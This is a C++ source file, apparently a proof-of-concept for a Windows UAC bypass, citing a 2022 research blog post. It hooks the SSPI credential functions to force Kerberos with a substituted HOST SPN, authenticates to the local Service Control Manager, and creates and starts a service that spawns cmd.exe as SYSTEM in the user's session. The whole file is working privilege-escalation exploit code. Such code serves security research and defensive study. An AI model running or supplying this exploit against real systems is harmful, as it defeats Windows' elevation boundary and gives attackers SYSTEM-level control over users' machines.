// This modifies the authentication to the local SCM to use Kerberos to abuse
// a UAC bypass through Kerberos tickets.
// See https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html

#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <security.h>
#include <stdio.h>
#include <string>
#include <strsafe.h>

#pragma comment(lib, "Secur32.lib")

static std::wstring spn;

SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(
    _In_opt_  LPWSTR pszPrincipal,                // Name of principal
    _In_      LPWSTR pszPackage,                  // Name of package
    _In_      unsigned long fCredentialUse,       // Flags indicating use
    _In_opt_  void* pvLogonId,                   // Pointer to logon ID
    _In_opt_  void* pAuthData,                   // Package specific data
    _In_opt_  SEC_GET_KEY_FN pGetKeyFn,           // Pointer to GetKey() func
    _In_opt_  void* pvGetKeyArgument,            // Value to pass to GetKey()
    _Out_     PCredHandle phCredential,           // (out) Cred Handle
    _Out_opt_ PTimeStamp ptsExpiry                // (out) Lifetime (optional)
)
{
    WCHAR kerberos_package[] = MICROSOFT_KERBEROS_NAME_W;
    printf("AcquireCredentialsHandleHook called for package %ls\n", pszPackage);
    if (_wcsicmp(pszPackage, L"Negotiate") == 0) {
        pszPackage = kerberos_package;
        printf("Changing to %ls package\n", pszPackage);
    }
    return AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse,
        pvLogonId, pAuthData, pGetKeyFn, pvGetKeyArgument, phCredential, ptsExpiry);
}

SECURITY_STATUS SEC_ENTRY InitializeSecurityContextWHook(
    _In_opt_    PCredHandle phCredential,               // Cred to base context
    _In_opt_    PCtxtHandle phContext,                  // Existing context (OPT)
    _In_opt_ SEC_WCHAR* pszTargetName,         // Name of target
    _In_        unsigned long fContextReq,              // Context Requirements
    _In_        unsigned long Reserved1,                // Reserved, MBZ
    _In_        unsigned long TargetDataRep,            // Data rep of target
    _In_opt_    PSecBufferDesc pInput,                  // Input Buffers
    _In_        unsigned long Reserved2,                // Reserved, MBZ
    _Inout_opt_ PCtxtHandle phNewContext,               // (out) New Context handle
    _Inout_opt_ PSecBufferDesc pOutput,                 // (inout) Output Buffers
    _Out_       unsigned long* pfContextAttr,  // (out) Context attrs
    _Out_opt_   PTimeStamp ptsExpiry                    // (out) Life span (OPT)
)
{
    // Change the SPN to match with the UAC bypass ticket you've registered.
    printf("InitializeSecurityContext called for target %ls\n", pszTargetName);
    SECURITY_STATUS status = InitializeSecurityContextW(phCredential, phContext, &spn[0], 
        fContextReq, Reserved1, TargetDataRep, pInput,
        Reserved2, phNewContext, pOutput, pfContextAttr, ptsExpiry);
    printf("InitializeSecurityContext status = %08X\n", status);
    return status;
}

int RunSystemProcess(const wchar_t* sid)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &hToken))
    {
        printf("Error opening process token %d\n", GetLastError());
        return 1;
    }
    HANDLE hPrimaryToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &hPrimaryToken))
    {
        printf("Error duplicating process token %d\n", GetLastError());
        return 1;
    }

    DWORD session_id = wcstoul(sid, nullptr, 0);
    if (!SetTokenInformation(hPrimaryToken, TokenSessionId, &session_id, sizeof(session_id)))
    {
        printf("Error setting session ID %d\n", GetLastError());
        return 1;
    }

    STARTUPINFO start_info = {};
    WCHAR desktop[] = L"WinSta0\\Default";
    start_info.cb = sizeof(start_info);
    start_info.lpDesktop = desktop;
    start_info.wShowWindow = SW_SHOW;

    WCHAR cmdline[] = L"cmd.exe";
    PROCESS_INFORMATION proc_info = {};
    if (!CreateProcessAsUser(hPrimaryToken, nullptr, cmdline, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
    {
        printf("Error creating process %d\n", GetLastError());
        return 1;
    }

    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);
    printf("Created process ID %d\n", proc_info.dwProcessId);

    return 0;
}

std::wstring GetExecutablePath()
{
    WCHAR path[MAX_PATH];
    if (GetModuleFileName(nullptr, path, MAX_PATH) != 0)
    {
        return path;
    }
    printf("Error getting executable path %d\n", GetLastError());
    return L"";
}

int wmain(int argc, wchar_t** argv)
{
    if (argc > 1)
    {
        return RunSystemProcess(argv[1]);
    }

    PSecurityFunctionTableW table = InitSecurityInterfaceW();
    table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook;
    table->InitializeSecurityContextW = InitializeSecurityContextWHook;

    WCHAR computer_name[1000];
    DWORD size = _countof(computer_name);
    if (!GetComputerName(computer_name, &size))
    {
        printf("Error getting computer name %d\n", GetLastError());
        return 1;
    }

    spn = L"HOST/";
    spn += computer_name;

    std::wstring exe = GetExecutablePath();
    if (exe.empty())
    {
        return 1;
    }

    DWORD session_id = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &session_id);

    WCHAR cmdline[MAX_PATH];
    StringCbPrintf(cmdline, sizeof(cmdline), L"\"%ls\" %d\n", exe.c_str(), session_id);

    SC_HANDLE hScm = OpenSCManagerW(L"127.0.0.1", nullptr, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!hScm)
    {
        printf("Error opening SCM %d\n", GetLastError());
        return 1;
    }

    SC_HANDLE hService = CreateService(hScm, L"UACBypassedService", nullptr, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, cmdline, nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!hService)
    {
        printf("Error creating service %d\n", GetLastError());
        return 1;
    }

    if (!StartService(hService, 0, nullptr))
    {
        printf("Error starting service %d\n", GetLastError());
        return 1;
    }

    return 0;
}
